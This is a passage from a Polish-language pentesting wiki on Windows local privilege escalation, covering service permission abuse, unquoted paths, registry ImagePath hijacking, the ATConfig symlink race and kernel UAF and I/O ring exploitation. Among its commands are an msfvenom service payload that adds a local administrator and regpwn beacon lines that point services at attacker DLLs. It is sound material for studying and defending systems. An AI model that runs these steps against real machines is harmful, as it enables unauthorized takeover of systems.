wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować przy użyciu różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę uprawnień, co pozwala na zmianę konfiguracji usługi.
- **WRITE_OWNER**: Pozwala przejąć własność i zmienić uprawnienia.
- **GENERIC_WRITE**: Dziedziczy możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również dziedziczy możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystywania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, usługę często można przejąć, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz zmodyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Za pomocą **wmic** (poza system32) możesz pobrać listę wszystkich plików binarnych uruchamianych przez usługi, a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych uprawnień ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi lub katalogu, w którym się on znajduje. Praktyczny sposób nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy można zapisywać do pliku binarnego, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym złośliwym plikiem binarnym usługi.
4. Uruchom ponownie usługę za pomocą `sc stop <service_name> && sc start <service_name>` (lub poczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma akcję w przypadku awarii, która uruchamia ją ponownie, lub czy aplikacja, która z niej korzysta, może wywołać ją pośrednio.

### Uprawnienia do modyfikacji rejestru usług

Sprawdź, czy możesz modyfikować rejestr którejś usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Pierwotny test uprawnień został sformułowany następująco:

Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia `FullControl`. Jeśli tak, można zmienić plik binarny uruchamiany przez usługę.

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w rejestrze dla określonego klucza usługi. Sam wpis ACL nie dowodzi, że dostęp jest skuteczny: znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są odrębne od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` do obiektu usługi. Eskalacja wymaga również użytecznego pola konfiguracji usługi, sposobu jej uruchomienia oraz tożsamości usługi z wyższymi uprawnieniami. Zobacz [uprawnienia do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) Microsoftu oraz [dokumentację uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę do pliku binarnego uruchamianego przez usługę:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig z dowiązaniem symbolicznym w rejestrze umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. Wyścig z **dowiązaniem symbolicznym** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, dając możliwość zapisu **dowolnej wartości** HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania lub przejść do bezpiecznego pulpitu i można do niego zapisywać jako użytkownik.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą chcesz zapisać jako SYSTEM.
2. Wywołaj kopiowanie na bezpiecznym pulpicie (np. przez **LockWorkstation**), co uruchamia przepływ AT broker.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zostanie wyzwolony, zastąp klucz **HKLM Session ATConfig** **linkiem rejestru** wskazującym na chroniony cel HKLM.
4. SYSTEM zapisze wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM przejdź do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć z niego podrejestry**. W przypadku usług Windows **wystarczy to do wykonania dowolnego kodu:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdą jej część kończącą się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie ścieżki usług bez cudzysłowów, z wyłączeniem ścieżek należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Działania odzyskiwania

Windows pozwala użytkownikom określić działania podejmowane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go zastąpić, możliwa może być eskalacja uprawnień. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty wskazywane przez zaplanowane zadania

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShell. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShella z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń w powłoce wymagają ręcznego prześledzenia. Skrypt lub katalog nadrzędny z prawami zapisu dla wywołującego wskazuje na możliwość wykonania kodu w kontekście innego konta tylko wtedy, gdy skonfigurowany principal zadania różni się od wywołującego i zadanie rzeczywiście wykonuje tę akcję. ACL pozwalająca jedynie na dopisywanie danych może mieć znaczenie dla skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania mogą sprawić, że dopisane wiersze będą nieosiągalne. Zanim stwierdzisz, że możliwa jest eskalacja uprawnień, potwierdź efektywne ACL, [kontekst wykonania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Nazwane strumienie w dostępnych plikach

W systemie NTFS plik z prawami odczytu może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna podczas zwykłego wyświetlania katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem jakiejkolwiek zawartości sprawdź **nazwy i rozmiary** strumieni; system Windows udostępnia je za pomocą [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz polecenia PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu jest jedynie wskazówką. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, na które faktycznie się uwierzytelniają. Podczas rutynowej enumeracji unikaj rekursywnego skanowania strumieni i wyświetlania ich zawartości.

## Pliki wejściowe pomocnika Windows Driver Kit uruchamianego przez zaplanowane zadanie

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może używać plików `command.txt`, `reboot.rsf` oraz pliku projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zaplanowane zadanie lub usługa uruchamiająca ten pomocnik na koncie z podwyższonymi uprawnieniami może umożliwić wykonanie poleceń w kontekście tego konta dzięki prawom zapisu dla użytkownika o niskich uprawnieniach do tych plików wejściowych, nawet jeśli sam plik wykonywalny pomocnika jest chroniony. Potwierdź, że pliki są używane przez proces działający z podwyższonymi uprawnieniami i że **oba** pliki pomocnicze można utworzyć lub zmodyfikować; samo znalezienie pomocnika nie wystarczy.

W przypadku zaplanowanego zadania sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL dwóch ścieżek do plików pomocniczych. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do zweryfikowania, a nie dowodem miejsca, z którego zadanie odczytuje pliki wejściowe. Musi być również spełniony warunek dotyczący pliku roboczego projektu. Sprawdź rzeczywisty principal zadania, zamiast zakładać, że działa ono jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może można nadpisać jeden z nich i eskalować uprawnienia) oraz **katalogów** ([DLL Hijacking](dll-hijacking/index.html).)

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk w Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie — gdy zastąpienie pliku się nie powiodło — uruchamiały istniejący wcześniej plik chroniony przed zapisem. Producent naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny poziom poprawek zainstalowanej wersji oraz to, czy może zostać wykonana operacja agenta, której dotyczy problem; sama nazwa gałęzi, np. `2.1`, nie pozwala stwierdzić, czy system jest podatny. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do katalogu Temp bez tworzenia plików ani uruchamiania poleceń agenta.

#### Przegląd usługi SAML w ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło wersji ADSelfService Plus 6210 i wcześniejszych; producent naprawił problem w wersji 6211. Ma znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: sprawdź dokładną wersję, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; do wykonania kodu jako SYSTEM wymagana jest instancja działająca jako SYSTEM. Możliwy do odczytu plik `OfflineBackup_*.ezip` w katalogu Backup produktu to odrębna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępne poświadczenia ani na tę podatność SAML. Podczas rutynowej enumeracji zanotuj jego ścieżkę i uprawnienia dostępu, nie rozpakowując go.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins w Windows rozróżnij uprawnienie do utworzenia lub konfiguracji zadania od uprawnienia do jego uruchomienia: [Jenkins opisuje je jako osobne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalny wyzwalacz może zapewniać inną możliwość uruchomienia kompilacji, ale potwierdź, że jest włączony i że kompilacja rzeczywiście się wykonuje. Kod działa z tożsamością kontrolera lub wybranego agenta, a zapisane poświadczenie można wykorzystać tylko wtedy, gdy zadanie ma dostęp do jego zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane poświadczeń i klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; sprawdź **prawo odczytu wymaganych plików** oraz odrębną możliwość ponownego użycia konta, nie wypisując sekretów we współdzielonych wynikach. Jeśli to konto ma prawo zapisu `scriptPath` obiektu użytkownika AD, sprawdź, czy ścieżka skryptu jest zapisywalna oraz czy istnieje rzeczywisty mechanizm logowania lub zaplanowane zadanie działające jako użytkownik docelowy, zanim uznasz to za wykonanie kodu z uprawnieniami innego użytkownika. Dalszą kontrolę grupy należy potwierdzić osobno, weryfikując efektywne uprawnienia AD.

#### Tożsamość samodzielnie hostowanego agenta Azure Pipelines

W przypadku Azure DevOps Server lub projektu Azure Pipelines rozdziel uprawnienie do **utworzenia lub edycji** potoku od uprawnienia do **umieszczenia go w kolejce** i użycia wybranej puli agentów; [Microsoft osobno opisuje uprawnienia do potoków](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić ten potok na samodzielnie hostowanym agencie Windows, krok wykonuje się jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz, że dochodzi do przejścia między użytkownikami lub uzyskania uprawnień SYSTEM, sprawdź konkretny potok, ograniczenia gałęzi i zasobów, autoryzowaną pulę, zadanie możliwe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub prawo zapisu w repozytorium to jedynie wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Poświadczenia Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, na którym działa usługa synchronizacji i które uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Poświadczenia łącznika są przechowywane w tej bazie danych w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama obecność zainstalowanej usługi synchronizacji, grupy o nazwie sugerującej uprawnienia administratora lokalnego lub dostęp do bazy danych nie potwierdza możliwości odszyfrowania poświadczeń ani eskalacji uprawnień w domenie. Osobno sprawdź rzeczywiste uprawnienia do odczytu bazy danych, dostęp do konta usługi i klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia tej tożsamości w AD. Rutynowa enumeracja powinna wykazywać jedynie metadane usługi i dostępu, a nie odpytywać ani wypisywać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługi sterownika drukarki

Zainstalowany sterownik drukarki może przechowywać biblioteki DLL obsługi w `C:\ProgramData` i ładować je w bardziej uprzywilejowanym procesie drukowania. Sprawdź dokładny katalog sterownika oraz listy ACL bibliotek DLL, w tym katalogi nadrzędne i punkty ponownej analizy — nawet jeśli enumeracja WMI drukarki jest zablokowana. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) wskazana ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [oryginalny opis](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) wyjaśnia ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapis w ACL to jedynie wskazówka: sprawdź efektywne prawo zapisu po uwzględnieniu wpisów odmowy, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprawnieniami uprzywilejowanej tożsamości oraz czy producent naprawił instalację w zaktualizowanym sterowniku lub programie zabezpieczeń. Nie wnioskuj o podatności na podstawie samej nazwy katalogu lub wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować plik konfiguracyjny, aby odczytać jakiś chroniony plik, albo zmodyfikować plik binarny, który ma zostać uruchomiony przez konto Administratora (schedtasks).

Sposobem na znalezienie w systemie katalogów lub plików o słabych uprawnieniach jest:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/wykonywanie przez automatyczne ładowanie pluginów Notepad++

Notepad++ automatycznie ładuje wszystkie biblioteki DLL pluginów z podfolderów `plugins`. Jeśli dostępna jest zapisywalna instalacja przenośna/kopia, umieszczenie w niej złośliwego pluginu zapewnia automatyczne wykonanie kodu w `notepad++.exe` przy każdym uruchomieniu (również z poziomu `DllMain` i callbacków pluginów).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać wpis rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnych **dziwnych/podatnych sterowników innych firm**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia prymityw umożliwiający dowolny odczyt/zapis w kernelu (częsty problem w źle zaprojektowanych handlerach IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela.<sup>[[13]](#references)</sup> Instrukcję krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Powiązane materiały dotyczące kernel exploitation w Windows:

W przypadku ring buffer działającego w kernel-mode, z rejestrami odczytu/zapisu, które może modyfikować użytkownik, zobacz [wariant USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów typu race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (za pomocą komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF w cancel-safe queue, ujawnienia paged-pool i pivoty I/O ring

Niektóre łańcuchy LPE w kernelu Windows można zbudować z dwóch niezbyt groźnych błędów: **wyścigu cyklu życia cancel-safe queue**, który zwalnia żądanie/CBD, gdy blokada kolejki jest nadal trzymana, oraz ujawnienia **lock-release-before-copy**, które ujawnia zwolnioną alokację paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i exploitation:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu wywoła `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolnione `PFLT_CALLBACK_DATA` do callbacku sterownika usuwającego element.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged-pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy Data Queue Entries w `NPFS` są przydatne, ponieważ można kontrolować ich payload i rozmiar, a później sprawdzać je operacjami odczytu/podglądu pipe. Jeśli zwolniony obiekt zawiera linki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby sterownik wielokrotnie przetwarzał struktury żądań zdefiniowane przez atakującego, zamiast zakończyć działanie na oryginalnym początku listy.
- **Ulepsz przewidywalny zapis**: jeśli fałszywe żądanie przekierowuje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z refcount), możesz uzyskać zapis do kernela z **kontrolowanym adresem, ale niekontrolowaną wartością**. W takim przypadku zaatakuj pole **length/size** obiektu pool zamiast końcowego wskaźnika kodu/danych, a następnie przeszukuj spray, aż uszkodzony obiekt umożliwi **odczyt poza zakresem z paged-pool**.
- **Wzorzec podatnego na race condition ujawnienia**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność rośnie, gdy atakujący może zwiększyć kopiowany bufor (na przykład dodając wiele wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie poszerza okno na podmianę bez konieczności zawieszenia systemu.
- **Cele uzupełniania zawierające dużo wskaźników**: tablice zarejestrowanych buforów Windows **I/O ring** są doskonałymi celami ujawnienia, ponieważ rozmiar ich alokacji paged-pool można kontrolować (`8 * regBufferCnt`), a każdy element jest wskaźnikiem kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały z podrobionych przez atakującego wpisów i umożliwiały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis pozwala ustawić stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby utworzyć wskaźnik użytkownika z powtarzającymi się bajtami, taki jak `0x0101010101010101`, zmapuj go przez `VirtualAlloc` i umieść tam podrobioną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki diagnostyczne:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu dowolnego odczytu/zapisu w kernelu przez uszkodzony I/O ring, ukradnij token SYSTEM, korzystając ze standardowego workflow po uzyskaniu prymitywu:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Prymitywy korupcji pamięci hive rejestru

Współczesne podatności hive pozwalają przygotować deterministyczny układ pamięci, wykorzystać zapisywalne klucze potomne HKLM/HKU i przekształcić korupcję metadanych w przepełnienia paged pool w kernelu, bez niestandardowego sterownika. Pełny łańcuch opisano tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomylenie typów w trybie direct funkcji `RtlQueryRegistryValues` przez ścieżki kontrolowane przez atakującego

Niektóre sterowniki przyjmują ścieżkę rejestru z userlandu, sprawdzają tylko, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` i przekazują na stosie zmienną skalarną, taką jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowany zgodnie z **rzeczywistym** typem rejestru, a nie typem oczekiwanym przez programistę.

Daje to dwa przydatne prymitywy:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala sterownikowi odpytywać wybrane przez atakującego klucze, ujawniać ich istnienie przez kody zwrotne/logi, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci kernela**: miejsce docelowe zmiennej skalarnej, takie jak `&readValue`, może być błędnie interpretowane jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze — zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące eksploatacji:

